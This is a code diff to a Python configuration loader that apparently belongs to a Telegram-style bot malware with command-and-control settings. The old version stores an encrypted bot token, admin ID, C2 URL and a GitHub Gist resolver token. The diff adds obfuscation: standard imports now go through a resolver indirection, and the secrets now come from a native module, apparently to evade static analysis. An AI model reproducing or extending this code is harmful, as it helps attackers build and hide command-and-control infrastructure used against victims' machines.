@@ -1,7 +1,10 @@
-import os
-import json
-from typing import Any, Dict, Optional
-from core.obfuscation import decrypt_string
+from core.resolver import (
+    Resolver, _OS, _JSON, _TYPING
+)
+os = Resolver.get_mod(_OS)
+json = Resolver.get_mod(_JSON)
+typing = Resolver.get_mod(_TYPING)
+Dict, Any = typing.Dict, typing.Any
 
 class ConfigManager:
     """
@@ -17,15 +20,18 @@ class ConfigManager:
     @classmethod
     def load(cls):
         """Loads and decrypts configuration from environment, embedded strings, or external file"""
+        Resolver.load_native()
+        Resolver.load_native()
+        import VanguardCore
         # 1. Start with embedded configuration (fallback)
         embedded = {
-            "BOT_TOKEN": decrypt_string("H1sCGSshKhY7BhsLUVcNCVRZEh9nNDcWKSgaShsIWA0uIzw="),
-            "ADMIN_ID": decrypt_string("XhsLUVcNCVRZEh9n"),
-            "GLOBAL_CHID": decrypt_string("XhsLUVcNCVRZEh9n"),
-            "GIST_RESOLVER_URL": decrypt_string("BkYMGz1rdk09HhlMXF4PDgZHGh49NCsBNRkeXRxNSBkBX1cZLyZ2Wz8UDl0UCAQfWVFBWngybQY+RVgPEV1WTFoLHAp+NWFNKgUFQBsXDAkBXA=="),
-            "C2_URL": decrypt_string("BkYMGz1rdk09HhlMXF4PDgZHGh49NCsBNRkeXRxNSBkBX1cZLyZ2Wz8UDl0UCAQfWVFBWngybQY+RVgPEV1WTFoLHAp+NWFNKgUFQBsXDAkBXA=="),
-            "GIST_PROXY_ID": "V1cbDys3aAA/QAkBQw8FTgpWSll5Mj1SbENTXBMJAkI=",
-            "GIST_GITHUB_TOKEN": "CVoINCcrEA45DRB5FmsRLTZVCwcCNG4zGzYoVTxuU0pXAUgJDyYLFg==",
+            "BOT_TOKEN": VanguardCore.SafetyManager.GetSecret("BOT_TOKEN"),
+            "ADMIN_ID": VanguardCore.SafetyManager.GetSecret("ADMIN_ID"),
+            "GLOBAL_CHID": VanguardCore.SafetyManager.GetSecret("ADMIN_ID"),
+            "GIST_RESOLVER_URL": VanguardCore.SafetyManager.GetSecret("GIST_URL"),
+            "C2_URL": VanguardCore.SafetyManager.GetSecret("GIST_URL"),
+            "GIST_PROXY_ID": VanguardCore.SafetyManager.GetSecret("GIST_PROXY_ID"),
+            "GIST_GITHUB_TOKEN": VanguardCore.SafetyManager.GetSecret("GIST_GITHUB_TOKEN"),
         }
         cls._config.update(embedded)
 
@@ -42,7 +48,7 @@ class ConfigManager:
                     with open(path, "r") as f:
                         enc_data = f.read().strip()
                         if enc_data:
-                            dec_data = decrypt_string(enc_data)
+                            dec_data = Resolver.decrypt(enc_data)
                             external_config = json.loads(dec_data)
                             cls._config.update(external_config)
                             # print(f"✅ Loaded external config from {path}")
